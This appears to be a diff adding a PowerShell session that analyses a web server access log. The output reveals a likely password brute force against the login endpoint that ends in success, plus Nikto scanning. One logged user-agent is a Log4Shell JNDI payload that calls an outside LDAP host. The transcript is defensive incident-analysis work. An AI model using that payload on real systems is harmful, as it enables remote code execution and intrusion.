@@ -1,0 +1,54 @@
+PS> $L = Get-Content web/access.log; $L.Count
+4105
+PS> $L = Get-Content web/access.log; $L | ForEach-Object { ($_ -split ' ')[0] } | Group-Object -NoElement | Sort-Object Count -Descending | Select-Object -First 10 Count, Name | Format-Table -AutoSize
+
+Count Name
+----- ----
+  422 203.0.113.66
+   76 192.0.2.12
+   74 192.0.2.31
+   74 198.51.100.113
+   72 192.0.2.29
+   72 192.0.2.23
+   71 192.0.2.40
+   71 192.0.2.18
+   69 198.51.100.105
+   68 192.0.2.33
+PS> $L = Get-Content web/access.log; $L | ForEach-Object { $p = $_ -split ' '; if ([int]$p[8] -ge 400) { "$($p[8]) $($p[6])" } } | Group-Object -NoElement | Sort-Object Count -Descending | Select-Object -First 5 Count, Name | Format-Table -AutoSize
+
+Count Name
+----- ----
+  420 401 /api/v1/auth/login
+   36 502 /api/v1/feed
+   29 504 /api/v1/feed
+   25 502 /api/v1/notifications
+   19 502 /api/v1/me
+PS> $L = Get-Content web/access.log; $L | ForEach-Object { $_.Substring($_.IndexOf('[') + 1, 17) } | Group-Object -NoElement | Sort-Object Count -Descending | Select-Object -First 1 Count, Name
+
+Count Name
+----- ----
+   36 20/Nov/2026:14:07
+PS> $L = Get-Content web/access.log; $e = ($L | Where-Object { [int]($_ -split ' ')[8] -ge 500 }).Count; '{0:N2}%' -f (100 * $e / $L.Count)
+3.34%
+PS> Get-Content web/access.log | ForEach-Object { ($_ -split '"')[5] } | Group-Object -NoElement | Sort-Object Count | Select-Object -First 3 Count, Name | Format-Table -AutoSize -Wrap
+
+Count Name
+----- ----
+    1 ${jndi:ldap://198.51.100.99:1389/a}
+   30 Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)
+  422 python-requests/2.32.3
+PS> Get-Content web/access.log | Where-Object { ($_ -split ' ')[8] -eq '401' } | ForEach-Object { ($_ -split ' ')[0] } | Group-Object -NoElement | Sort-Object Count -Descending | Select-Object -First 1 Count, Name
+
+Count Name
+----- ----
+  420 203.0.113.66
+PS> Select-String -Path web/access.log -Pattern '^203\.0\.113\.66 .* 200 ' | ForEach-Object { $p = $_.Line -split ' '; "$($p[3]) $($p[5]) $($p[6]) $($p[8])" }
+[20/Nov/2026:02:41:07 "POST /api/v1/auth/login 200
+[20/Nov/2026:02:41:09 "GET /api/v1/me 200
+PS> Get-Content web/access.log | ForEach-Object { $_.Substring($_.IndexOf('[') + 13, 2) } | Group-Object -NoElement | Sort-Object Count -Descending | Select-Object -First 1 Count, Name
+
+Count Name
+----- ----
+  442 02
+PS> '{0:N1} MB' -f ((Get-Content web/access.log | ForEach-Object { [long]($_ -split ' ')[9] } | Measure-Object -Sum).Sum / 1MB)
+77.9 MB
